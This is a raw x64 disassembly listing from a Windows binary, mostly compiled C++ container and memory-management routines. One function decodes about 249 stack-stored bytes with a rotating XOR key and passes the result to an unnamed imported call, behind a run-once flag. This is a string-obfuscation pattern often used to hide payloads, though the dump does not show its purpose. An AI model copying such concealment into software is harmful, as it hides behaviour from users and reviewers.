   1400032cd:	48 8b d6             	mov    %rsi,%rdx
   1400032d0:	4c 8b f0             	mov    %rax,%r14
   1400032d3:	48 2b d5             	sub    %rbp,%rdx
   1400032d6:	83 3f 00             	cmpl   $0x0,(%rdi)
   1400032d9:	48 8d 0c a8          	lea    (%rax,%rbp,4),%rcx
   1400032dd:	75 2a                	jne    0x140003309
   1400032df:	4c 8d 04 95 00 00 00 	lea    0x0(,%rdx,4),%r8
   1400032e6:	00 
   1400032e7:	33 d2                	xor    %edx,%edx
   1400032e9:	e8 62 63 00 00       	call   0x140009650
   1400032ee:	eb 2e                	jmp    0x14000331e
   1400032f0:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
   1400032f4:	48 3b c6             	cmp    %rsi,%rax
   1400032f7:	73 05                	jae    0x1400032fe
   1400032f9:	48 8b c6             	mov    %rsi,%rax
   1400032fc:	eb b5                	jmp    0x1400032b3
   1400032fe:	49 3b c0             	cmp    %r8,%rax
   140003301:	0f 87 ac 00 00 00    	ja     0x1400033b3
   140003307:	eb aa                	jmp    0x1400032b3
   140003309:	48 85 d2             	test   %rdx,%rdx
   14000330c:	74 10                	je     0x14000331e
   14000330e:	66 90                	xchg   %ax,%ax
   140003310:	8b 07                	mov    (%rdi),%eax
   140003312:	89 01                	mov    %eax,(%rcx)
   140003314:	48 8d 49 04          	lea    0x4(%rcx),%rcx
   140003318:	48 83 ea 01          	sub    $0x1,%rdx
   14000331c:	75 f2                	jne    0x140003310
   14000331e:	48 8b 13             	mov    (%rbx),%rdx
   140003321:	49 8b ce             	mov    %r14,%rcx
   140003324:	4c 8b 43 08          	mov    0x8(%rbx),%r8
   140003328:	4c 2b c2             	sub    %rdx,%r8
   14000332b:	e8 1a 63 00 00       	call   0x14000964a
   140003330:	48 8b 0b             	mov    (%rbx),%rcx
   140003333:	48 85 c9             	test   %rcx,%rcx
   140003336:	74 31                	je     0x140003369
   140003338:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   14000333c:	48 2b d1             	sub    %rcx,%rdx
   14000333f:	48 83 e2 fc          	and    $0xfffffffffffffffc,%rdx
   140003343:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000334a:	72 18                	jb     0x140003364
   14000334c:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140003350:	48 83 c2 27          	add    $0x27,%rdx
   140003354:	48 2b c8             	sub    %rax,%rcx
   140003357:	48 83 e9 08          	sub    $0x8,%rcx
   14000335b:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000335f:	77 32                	ja     0x140003393
   140003361:	48 8b c8             	mov    %rax,%rcx
   140003364:	e8 6f 54 00 00       	call   0x1400087d8
   140003369:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   14000336e:	49 8d 04 b6          	lea    (%r14,%rsi,4),%rax
   140003372:	4c 89 33             	mov    %r14,(%rbx)
   140003375:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140003379:	4b 8d 04 37          	lea    (%r15,%r14,1),%rax
   14000337d:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   140003382:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   140003387:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000338b:	48 83 c4 30          	add    $0x30,%rsp
   14000338f:	5f                   	pop    %rdi
   140003390:	5e                   	pop    %rsi
   140003391:	5b                   	pop    %rbx
   140003392:	c3                   	ret
   140003393:	45 33 c9             	xor    %r9d,%r9d
   140003396:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000339d:	00 00 
   14000339f:	45 33 c0             	xor    %r8d,%r8d
   1400033a2:	33 d2                	xor    %edx,%edx
   1400033a4:	33 c9                	xor    %ecx,%ecx
   1400033a6:	ff 15 bc 70 00 00    	call   *0x70bc(%rip)        # 0x14000a468
   1400033ac:	cc                   	int3
   1400033ad:	e8 6e e9 ff ff       	call   0x140001d20
   1400033b2:	cc                   	int3
   1400033b3:	e8 a8 e8 ff ff       	call   0x140001c60
   1400033b8:	cc                   	int3
   1400033b9:	cc                   	int3
   1400033ba:	cc                   	int3
   1400033bb:	cc                   	int3
   1400033bc:	cc                   	int3
   1400033bd:	cc                   	int3
   1400033be:	cc                   	int3
   1400033bf:	cc                   	int3
   1400033c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400033c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400033ca:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400033cf:	55                   	push   %rbp
   1400033d0:	41 54                	push   %r12
   1400033d2:	41 55                	push   %r13
   1400033d4:	41 56                	push   %r14
   1400033d6:	41 57                	push   %r15
   1400033d8:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   1400033dd:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   1400033e4:	48 8b 05 d5 f7 00 00 	mov    0xf7d5(%rip),%rax        # 0x140012bc0
   1400033eb:	48 33 c4             	xor    %rsp,%rax
   1400033ee:	48 89 45 58          	mov    %rax,0x58(%rbp)
   1400033f2:	48 8b c1             	mov    %rcx,%rax
   1400033f5:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   1400033f9:	80 3d a0 fb 00 00 00 	cmpb   $0x0,0xfba0(%rip)        # 0x140012fa0
   140003400:	0f 85 b3 03 00 00    	jne    0x1400037b9
   140003406:	c7 44 24 30 11 54 14 	movl   $0x1d145411,0x30(%rsp)
   14000340d:	1d 
   14000340e:	c7 44 24 34 ca 24 7e 	movl   $0x267e24ca,0x34(%rsp)
   140003415:	26 
   140003416:	c7 44 24 38 b3 96 1d 	movl   $0xf41d96b3,0x38(%rsp)
   14000341d:	f4 
   14000341e:	c7 44 24 3c 9b b8 37 	movl   $0x9637b89b,0x3c(%rsp)
   140003425:	96 
   140003426:	c7 44 24 40 6a d5 e5 	movl   $0xf0e5d56a,0x40(%rsp)
   14000342d:	f0 
   14000342e:	c7 44 24 44 4d b4 d1 	movl   $0x54d1b44d,0x44(%rsp)
   140003435:	54 
   140003436:	c7 44 24 48 3d 2d ff 	movl   $0x74ff2d3d,0x48(%rsp)
   14000343d:	74 
   14000343e:	c7 44 24 4c 0e 49 05 	movl   $0xf05490e,0x4c(%rsp)
   140003445:	0f 
   140003446:	c7 44 24 50 a2 2d 02 	movl   $0x26022da2,0x50(%rsp)
   14000344d:	26 
   14000344e:	c7 44 24 54 b0 80 5e 	movl   $0xdc5e80b0,0x54(%rsp)
   140003455:	dc 
   140003456:	c7 44 24 58 a9 ac 64 	movl   $0x9b64aca9,0x58(%rsp)
   14000345d:	9b 
   14000345e:	c7 44 24 5c 73 9c b1 	movl   $0xbab19c73,0x5c(%rsp)
   140003465:	ba 
   140003466:	c7 44 24 60 56 f4 c0 	movl   $0x51c0f456,0x60(%rsp)
   14000346d:	51 
   14000346e:	c7 44 24 64 6e 59 c2 	movl   $0x74c2596e,0x64(%rsp)
   140003475:	74 
   140003476:	c7 44 24 68 07 45 0c 	movl   $0x90c4507,0x68(%rsp)
   14000347d:	09 
   14000347e:	c7 44 24 6c e2 2c 6b 	movl   $0x656b2ce2,0x6c(%rsp)
   140003485:	65 
   140003486:	c7 44 24 70 82 9b 15 	movl   $0xc6159b82,0x70(%rsp)
   14000348d:	c6 
   14000348e:	c7 44 24 74 89 b6 31 	movl   $0xa631b689,0x74(%rsp)
   140003495:	a6 
   140003496:	c7 44 24 78 4f ca 94 	movl   $0xf794ca4f,0x78(%rsp)
   14000349d:	f7 
   14000349e:	c7 44 24 7c 11 f4 ad 	movl   $0x47adf411,0x7c(%rsp)
   1400034a5:	47 
   1400034a6:	c7 45 80 22 03 bf 30 	movl   $0x30bf0322,-0x80(%rbp)
   1400034ad:	c7 45 84 41 22 02 18 	movl   $0x18022241,-0x7c(%rbp)
   1400034b4:	c7 45 88 a7 64 24 25 	movl   $0x252464a7,-0x78(%rbp)
   1400034bb:	c7 45 8c d4 8d 5b da 	movl   $0xda5b8dd4,-0x74(%rbp)
   1400034c2:	c7 45 90 ec b5 7e a0 	movl   $0xa07eb5ec,-0x70(%rbp)
   1400034c9:	c7 45 94 4d d0 93 c4 	movl   $0xc493d04d,-0x6c(%rbp)
   1400034d0:	c7 45 98 68 fd a9 52 	movl   $0x52a9fd68,-0x68(%rbp)
   1400034d7:	c7 45 9c 20 52 c9 7b 	movl   $0x7bc95220,-0x64(%rbp)
   1400034de:	c7 45 a0 02 6f 07 13 	movl   $0x13076f02,-0x60(%rbp)
   1400034e5:	c7 45 a4 b3 04 2e 6d 	movl   $0x6d2e04b3,-0x5c(%rbp)
   1400034ec:	c7 45 a8 df d1 60 ea 	movl   $0xea60d1df,-0x58(%rbp)
   1400034f3:	c7 45 ac a5 fe 58 e7 	movl   $0xe758fea5,-0x54(%rbp)
   1400034fa:	c7 45 b0 a9 d6 84 8a 	movl   $0x8a84d6a9,-0x50(%rbp)
   140003501:	c7 45 b4 76 e9 b6 9b 	movl   $0x9bb6e976,-0x4c(%rbp)
   140003508:	c7 45 b8 08 3d 8d 27 	movl   $0x278d3d08,-0x48(%rbp)
   14000350f:	c7 45 bc 4e 72 ed 0b 	movl   $0xbed724e,-0x44(%rbp)
   140003516:	c7 45 c0 e6 17 65 72 	movl   $0x726517e6,-0x40(%rbp)
   14000351d:	c7 45 c4 e1 61 55 fd 	movl   $0xfd5561e1,-0x3c(%rbp)
   140003524:	c7 45 c8 a3 a4 68 a7 	movl   $0xa768a4a3,-0x38(%rbp)
   14000352b:	c7 45 cc c2 c9 87 95 	movl   $0x9587c9c2,-0x34(%rbp)
   140003532:	c7 45 d0 38 d4 90 82 	movl   $0x8290d438,-0x30(%rbp)
   140003539:	c7 45 d4 0e 38 f3 60 	movl   $0x60f3380e,-0x2c(%rbp)
   140003540:	c7 45 d8 4b 68 ac 42 	movl   $0x42ac684b,-0x28(%rbp)
   140003547:	c7 45 dc a0 0e 57 36 	movl   $0x36570ea0,-0x24(%rbp)
   14000354e:	c7 45 e0 ca 75 1e 9f 	movl   $0x9f1e75ca,-0x20(%rbp)
   140003555:	c7 45 e4 9d 80 60 e9 	movl   $0xe960809d,-0x1c(%rbp)
   14000355c:	c7 45 e8 9e 85 bd 95 	movl   $0x95bd859e,-0x18(%rbp)
   140003563:	c7 45 ec 69 ef ac b0 	movl   $0xb0acef69,-0x14(%rbp)
   14000356a:	c7 45 f0 51 40 98 69 	movl   $0x69984051,-0x10(%rbp)
   140003571:	c7 45 f4 17 28 f4 5b 	movl   $0x5bf42817,-0xc(%rbp)
   140003578:	c7 45 f8 fb 4c 15 77 	movl   $0x77154cfb,-0x8(%rbp)
   14000357f:	c7 45 fc 92 79 37 c5 	movl   $0xc5377992,-0x4(%rbp)
   140003586:	c7 45 00 e8 a4 40 d2 	movl   $0xd240a4e8,0x0(%rbp)
   14000358d:	c7 45 04 be 88 a3 b0 	movl   $0xb0a388be,0x4(%rbp)
   140003594:	c7 45 08 3b b8 fc f2 	movl   $0xf2fcb83b,0x8(%rbp)
   14000359b:	c7 45 0c 10 5e 87 46 	movl   $0x46875e10,0xc(%rbp)
   1400035a2:	c7 45 10 3a 25 b5 22 	movl   $0x22b5253a,0x10(%rbp)
   1400035a9:	c7 45 14 c9 4d 1f 0f 	movl   $0xf1f4dc9,0x14(%rbp)
   1400035b0:	c7 45 18 d5 6f 0e c3 	movl   $0xc30e6fd5,0x18(%rbp)
   1400035b7:	c7 45 1c af 90 5c b3 	movl   $0xb35c90af,0x1c(%rbp)
   1400035be:	c7 45 20 ba b9 81 9b 	movl   $0x9b81b9ba,0x20(%rbp)
   1400035c5:	c7 45 24 6b da e1 a6 	movl   $0xa6e1da6b,0x24(%rbp)
   1400035cc:	66 c7 45 28 08 00    	movw   $0x8,0x28(%rbp)
   1400035d2:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400035d5:	0f 11 45 38          	movups %xmm0,0x38(%rbp)
   1400035d9:	33 f6                	xor    %esi,%esi
   1400035db:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   1400035df:	41 be 0f 00 00 00    	mov    $0xf,%r14d
   1400035e5:	4c 89 75 50          	mov    %r14,0x50(%rbp)
   1400035e9:	40 88 75 38          	mov    %sil,0x38(%rbp)
   1400035ed:	45 33 ff             	xor    %r15d,%r15d
   1400035f0:	48 ba ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdx
   1400035f7:	ff ff 7f 
   1400035fa:	48 8b 7d 38          	mov    0x38(%rbp),%rdi
   1400035fe:	66 90                	xchg   %ax,%ax
   140003600:	41 0f b6 cf          	movzbl %r15b,%ecx
   140003604:	80 e1 03             	and    $0x3,%cl
   140003607:	c0 e1 03             	shl    $0x3,%cl
   14000360a:	41 bc 62 17 1b ca    	mov    $0xca1b1762,%r12d
   140003610:	41 d3 ec             	shr    %cl,%r12d
   140003613:	46 32 64 3c 30       	xor    0x30(%rsp,%r15,1),%r12b
   140003618:	41 0f be c7          	movsbl %r15b,%eax
   14000361c:	6b c8 37             	imul   $0x37,%eax,%ecx
   14000361f:	44 32 e1             	xor    %cl,%r12b
   140003622:	49 3b f6             	cmp    %r14,%rsi
   140003625:	73 26                	jae    0x14000364d
   140003627:	48 8d 46 01          	lea    0x1(%rsi),%rax
   14000362b:	48 89 45 48          	mov    %rax,0x48(%rbp)
   14000362f:	48 8d 45 38          	lea    0x38(%rbp),%rax
   140003633:	49 83 fe 0f          	cmp    $0xf,%r14
   140003637:	48 0f 47 c7          	cmova  %rdi,%rax
   14000363b:	44 88 24 30          	mov    %r12b,(%rax,%rsi,1)
   14000363f:	c6 44 30 01 00       	movb   $0x0,0x1(%rax,%rsi,1)
   140003644:	48 8b 7d 38          	mov    0x38(%rbp),%rdi
   140003648:	e9 ca 00 00 00       	jmp    0x140003717
   14000364d:	48 8b c2             	mov    %rdx,%rax
   140003650:	48 2b c6             	sub    %rsi,%rax
   140003653:	48 83 f8 01          	cmp    $0x1,%rax
   140003657:	0f 82 89 01 00 00    	jb     0x1400037e6
   14000365d:	4c 8d 6e 01          	lea    0x1(%rsi),%r13
   140003661:	49 8b dd             	mov    %r13,%rbx
   140003664:	48 83 cb 0f          	or     $0xf,%rbx
   140003668:	48 3b da             	cmp    %rdx,%rbx
   14000366b:	76 05                	jbe    0x140003672
   14000366d:	48 8b da             	mov    %rdx,%rbx
   140003670:	eb 21                	jmp    0x140003693
   140003672:	49 8b ce             	mov    %r14,%rcx
   140003675:	48 d1 e9             	shr    $1,%rcx
   140003678:	48 8b c2             	mov    %rdx,%rax
   14000367b:	48 2b c1             	sub    %rcx,%rax
   14000367e:	4c 3b f0             	cmp    %rax,%r14
   140003681:	76 05                	jbe    0x140003688
   140003683:	48 8b da             	mov    %rdx,%rbx
   140003686:	eb 0b                	jmp    0x140003693
   140003688:	4a 8d 04 31          	lea    (%rcx,%r14,1),%rax
   14000368c:	48 3b d8             	cmp    %rax,%rbx
   14000368f:	48 0f 42 d8          	cmovb  %rax,%rbx
   140003693:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140003697:	e8 24 dc ff ff       	call   0x1400012c0
   14000369c:	48 8b f8             	mov    %rax,%rdi
   14000369f:	4c 89 6d 48          	mov    %r13,0x48(%rbp)
   1400036a3:	48 89 5d 50          	mov    %rbx,0x50(%rbp)
   1400036a7:	4c 8b c6             	mov    %rsi,%r8
   1400036aa:	48 8b c8             	mov    %rax,%rcx
   1400036ad:	49 83 fe 0f          	cmp    $0xf,%r14
   1400036b1:	76 44                	jbe    0x1400036f7
   1400036b3:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   1400036b7:	48 8b d3             	mov    %rbx,%rdx
   1400036ba:	e8 85 5f 00 00       	call   0x140009644
   1400036bf:	44 88 24 37          	mov    %r12b,(%rdi,%rsi,1)
   1400036c3:	c6 44 37 01 00       	movb   $0x0,0x1(%rdi,%rsi,1)
   1400036c8:	49 8d 56 01          	lea    0x1(%r14),%rdx
   1400036cc:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400036d3:	72 18                	jb     0x1400036ed
   1400036d5:	48 83 c2 27          	add    $0x27,%rdx
   1400036d9:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400036dd:	48 2b d8             	sub    %rax,%rbx
   1400036e0:	48 83 eb 08          	sub    $0x8,%rbx
   1400036e4:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400036e8:	77 46                	ja     0x140003730
   1400036ea:	48 8b d8             	mov    %rax,%rbx
   1400036ed:	48 8b cb             	mov    %rbx,%rcx
   1400036f0:	e8 e3 50 00 00       	call   0x1400087d8
   1400036f5:	eb 12                	jmp    0x140003709
   1400036f7:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   1400036fb:	e8 44 5f 00 00       	call   0x140009644
   140003700:	44 88 24 37          	mov    %r12b,(%rdi,%rsi,1)
   140003704:	c6 44 37 01 00       	movb   $0x0,0x1(%rdi,%rsi,1)
   140003709:	48 ba ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdx
   140003710:	ff ff 7f 
   140003713:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140003717:	49 ff c7             	inc    %r15
   14000371a:	49 81 ff f9 00 00 00 	cmp    $0xf9,%r15
   140003721:	73 27                	jae    0x14000374a
   140003723:	4c 8b 75 50          	mov    0x50(%rbp),%r14
   140003727:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000372b:	e9 d0 fe ff ff       	jmp    0x140003600
   140003730:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003737:	00 00 
   140003739:	45 33 c9             	xor    %r9d,%r9d
   14000373c:	45 33 c0             	xor    %r8d,%r8d
   14000373f:	33 d2                	xor    %edx,%edx
   140003741:	33 c9                	xor    %ecx,%ecx
   140003743:	ff 15 1f 6d 00 00    	call   *0x6d1f(%rip)        # 0x14000a468
   140003749:	cc                   	int3
   14000374a:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   14000374e:	48 83 7d 50 0f       	cmpq   $0xf,0x50(%rbp)
   140003753:	48 0f 47 cf          	cmova  %rdi,%rcx
   140003757:	ff 15 a3 6c 00 00    	call   *0x6ca3(%rip)        # 0x14000a400
   14000375d:	c6 05 3c f8 00 00 01 	movb   $0x1,0xf83c(%rip)        # 0x140012fa0
   140003764:	48 8b 55 50          	mov    0x50(%rbp),%rdx
   140003768:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000376c:	76 47                	jbe    0x1400037b5
   14000376e:	48 ff c2             	inc    %rdx
   140003771:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140003775:	48 8b c1             	mov    %rcx,%rax
   140003778:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000377f:	72 2f                	jb     0x1400037b0
   140003781:	48 83 c2 27          	add    $0x27,%rdx
   140003785:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003789:	48 2b c1             	sub    %rcx,%rax
   14000378c:	48 83 e8 08          	sub    $0x8,%rax
   140003790:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003794:	76 1a                	jbe    0x1400037b0
   140003796:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000379d:	00 00 
   14000379f:	45 33 c9             	xor    %r9d,%r9d
   1400037a2:	45 33 c0             	xor    %r8d,%r8d
   1400037a5:	33 d2                	xor    %edx,%edx
   1400037a7:	33 c9                	xor    %ecx,%ecx
   1400037a9:	ff 15 b9 6c 00 00    	call   *0x6cb9(%rip)        # 0x14000a468
   1400037af:	cc                   	int3
   1400037b0:	e8 23 50 00 00       	call   0x1400087d8
   1400037b5:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400037b9:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   1400037bd:	48 33 cc             	xor    %rsp,%rcx
   1400037c0:	e8 ab 50 00 00       	call   0x140008870
   1400037c5:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   1400037cc:	00 
   1400037cd:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400037d1:	49 8b 73 38          	mov    0x38(%r11),%rsi
   1400037d5:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   1400037d9:	49 8b e3             	mov    %r11,%rsp
   1400037dc:	41 5f                	pop    %r15
   1400037de:	41 5e                	pop    %r14
   1400037e0:	41 5d                	pop    %r13
   1400037e2:	41 5c                	pop    %r12
   1400037e4:	5d                   	pop    %rbp
   1400037e5:	c3                   	ret
   1400037e6:	e8 15 e5 ff ff       	call   0x140001d00
   1400037eb:	90                   	nop
   1400037ec:	cc                   	int3
   1400037ed:	cc                   	int3
   1400037ee:	cc                   	int3
   1400037ef:	cc                   	int3
   1400037f0:	e9 bb 03 00 00       	jmp    0x140003bb0
   1400037f5:	cc                   	int3
   1400037f6:	cc                   	int3
   1400037f7:	cc                   	int3
   1400037f8:	cc                   	int3
   1400037f9:	cc                   	int3
   1400037fa:	cc                   	int3
   1400037fb:	cc                   	int3
   1400037fc:	cc                   	int3
   1400037fd:	cc                   	int3
   1400037fe:	cc                   	int3
   1400037ff:	cc                   	int3
   140003800:	40 53                	rex push %rbx
   140003802:	48 83 ec 30          	sub    $0x30,%rsp
   140003806:	48 8b d9             	mov    %rcx,%rbx
   140003809:	48 8b 09             	mov    (%rcx),%rcx
   14000380c:	48 85 c9             	test   %rcx,%rcx
   14000380f:	74 3e                	je     0x14000384f
   140003811:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140003815:	48 2b d1             	sub    %rcx,%rdx
   140003818:	48 83 e2 fc          	and    $0xfffffffffffffffc,%rdx
   14000381c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003823:	72 18                	jb     0x14000383d
   140003825:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140003829:	48 83 c2 27          	add    $0x27,%rdx
   14000382d:	48 2b c8             	sub    %rax,%rcx
   140003830:	48 83 e9 08          	sub    $0x8,%rcx
   140003834:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140003838:	77 1b                	ja     0x140003855
   14000383a:	48 8b c8             	mov    %rax,%rcx
   14000383d:	e8 96 4f 00 00       	call   0x1400087d8
   140003842:	33 c0                	xor    %eax,%eax
   140003844:	48 89 03             	mov    %rax,(%rbx)
   140003847:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000384b:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000384f:	48 83 c4 30          	add    $0x30,%rsp
   140003853:	5b                   	pop    %rbx
   140003854:	c3                   	ret
   140003855:	33 c0                	xor    %eax,%eax
   140003857:	45 33 c9             	xor    %r9d,%r9d
   14000385a:	45 33 c0             	xor    %r8d,%r8d
   14000385d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003862:	33 d2                	xor    %edx,%edx
   140003864:	33 c9                	xor    %ecx,%ecx
   140003866:	ff 15 fc 6b 00 00    	call   *0x6bfc(%rip)        # 0x14000a468
   14000386c:	cc                   	int3
   14000386d:	cc                   	int3
   14000386e:	cc                   	int3
   14000386f:	cc                   	int3
   140003870:	e9 8b ff ff ff       	jmp    0x140003800
   140003875:	cc                   	int3
   140003876:	cc                   	int3
   140003877:	cc                   	int3
   140003878:	cc                   	int3
   140003879:	cc                   	int3
   14000387a:	cc                   	int3
   14000387b:	cc                   	int3
   14000387c:	cc                   	int3
   14000387d:	cc                   	int3
   14000387e:	cc                   	int3
   14000387f:	cc                   	int3
   140003880:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003885:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000388a:	57                   	push   %rdi
   14000388b:	48 83 ec 30          	sub    $0x30,%rsp
   14000388f:	48 8b 02             	mov    (%rdx),%rax
   140003892:	48 8d 72 10          	lea    0x10(%rdx),%rsi
   140003896:	48 89 01             	mov    %rax,(%rcx)
   140003899:	48 8d 59 10          	lea    0x10(%rcx),%rbx
   14000389d:	48 8b 42 08          	mov    0x8(%rdx),%rax
   1400038a1:	48 8b f9             	mov    %rcx,%rdi
   1400038a4:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400038a8:	48 3b de             	cmp    %rsi,%rbx
   1400038ab:	74 62                	je     0x14000390f
   1400038ad:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1400038b1:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400038b5:	76 2c                	jbe    0x1400038e3
   1400038b7:	48 8b 0b             	mov    (%rbx),%rcx
   1400038ba:	48 ff c2             	inc    %rdx
   1400038bd:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400038c4:	72 18                	jb     0x1400038de
   1400038c6:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1400038ca:	48 83 c2 27          	add    $0x27,%rdx
   1400038ce:	48 2b c8             	sub    %rax,%rcx
   1400038d1:	48 83 e9 08          	sub    $0x8,%rcx
   1400038d5:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1400038d9:	77 47                	ja     0x140003922
   1400038db:	48 8b c8             	mov    %rax,%rcx
   1400038de:	e8 f5 4e 00 00       	call   0x1400087d8
   1400038e3:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1400038ea:	00 
   1400038eb:	33 c0                	xor    %eax,%eax
   1400038ed:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400038f1:	88 03                	mov    %al,(%rbx)
   1400038f3:	0f 10 06             	movups (%rsi),%xmm0
   1400038f6:	0f 11 03             	movups %xmm0,(%rbx)
   1400038f9:	0f 10 4e 10          	movups 0x10(%rsi),%xmm1
   1400038fd:	0f 11 4b 10          	movups %xmm1,0x10(%rbx)
   140003901:	48 89 46 10          	mov    %rax,0x10(%rsi)
   140003905:	48 c7 46 18 0f 00 00 	movq   $0xf,0x18(%rsi)
   14000390c:	00 
   14000390d:	88 06                	mov    %al,(%rsi)
   14000390f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003914:	48 8b c7             	mov    %rdi,%rax
   140003917:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000391c:	48 83 c4 30          	add    $0x30,%rsp
   140003920:	5f                   	pop    %rdi
   140003921:	c3                   	ret
   140003922:	33 c0                	xor    %eax,%eax
   140003924:	45 33 c9             	xor    %r9d,%r9d
   140003927:	45 33 c0             	xor    %r8d,%r8d
   14000392a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000392f:	33 d2                	xor    %edx,%edx
   140003931:	33 c9                	xor    %ecx,%ecx
   140003933:	ff 15 2f 6b 00 00    	call   *0x6b2f(%rip)        # 0x14000a468
   140003939:	cc                   	int3
   14000393a:	cc                   	int3
   14000393b:	cc                   	int3
   14000393c:	cc                   	int3
   14000393d:	cc                   	int3
   14000393e:	cc                   	int3
   14000393f:	cc                   	int3
   140003940:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003945:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000394a:	41 56                	push   %r14
   14000394c:	48 83 ec 30          	sub    $0x30,%rsp
   140003950:	4c 8b 32             	mov    (%rdx),%r14
   140003953:	48 8b f9             	mov    %rcx,%rdi
   140003956:	48 8b 09             	mov    (%rcx),%rcx
   140003959:	49 8b e8             	mov    %r8,%rbp
   14000395c:	4c 2b f1             	sub    %rcx,%r14
   14000395f:	49 c1 fe 02          	sar    $0x2,%r14
   140003963:	49 c1 e6 05          	shl    $0x5,%r14
   140003967:	4c 03 72 08          	add    0x8(%rdx),%r14
   14000396b:	4d 85 c0             	test   %r8,%r8
   14000396e:	0f 84 09 01 00 00    	je     0x140003a7d
   140003974:	4c 8b 47 18          	mov    0x18(%rdi),%r8
   140003978:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000397f:	ff ff 7f 
   140003982:	49 2b c0             	sub    %r8,%rax
   140003985:	48 3b c5             	cmp    %rbp,%rax
   140003988:	0f 82 1b 02 00 00    	jb     0x140003ba9
   14000398e:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140003993:	33 d2                	xor    %edx,%edx
   140003995:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   14000399a:	48 8d 5d 1f          	lea    0x1f(%rbp),%rbx
   14000399e:	48 8b 77 08          	mov    0x8(%rdi),%rsi
   1400039a2:	49 03 d8             	add    %r8,%rbx
   1400039a5:	4c 8b c6             	mov    %rsi,%r8
   1400039a8:	48 c1 eb 05          	shr    $0x5,%rbx
   1400039ac:	4c 2b c1             	sub    %rcx,%r8
   1400039af:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1400039b3:	49 c1 f8 02          	sar    $0x2,%r8
   1400039b7:	49 3b d8             	cmp    %r8,%rbx
   1400039ba:	73 0d                	jae    0x1400039c9
   1400039bc:	48 8d 04 99          	lea    (%rcx,%rbx,4),%rax
   1400039c0:	48 89 47 08          	mov    %rax,0x8(%rdi)
   1400039c4:	e9 99 00 00 00       	jmp    0x140003a62
   1400039c9:	0f 86 93 00 00 00    	jbe    0x140003a62
   1400039cf:	48 8b 47 10          	mov    0x10(%rdi),%rax
   1400039d3:	48 2b c1             	sub    %rcx,%rax
   1400039d6:	48 c1 f8 02          	sar    $0x2,%rax
   1400039da:	48 3b d8             	cmp    %rax,%rbx
   1400039dd:	76 12                	jbe    0x1400039f1
   1400039df:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400039e4:	48 8b d3             	mov    %rbx,%rdx
   1400039e7:	48 8b cf             	mov    %rdi,%rcx
   1400039ea:	e8 71 f8 ff ff       	call   0x140003260
   1400039ef:	eb 71                	jmp    0x140003a62
   1400039f1:	49 2b d8             	sub    %r8,%rbx
   1400039f4:	89 54 24 24          	mov    %edx,0x24(%rsp)
   1400039f8:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
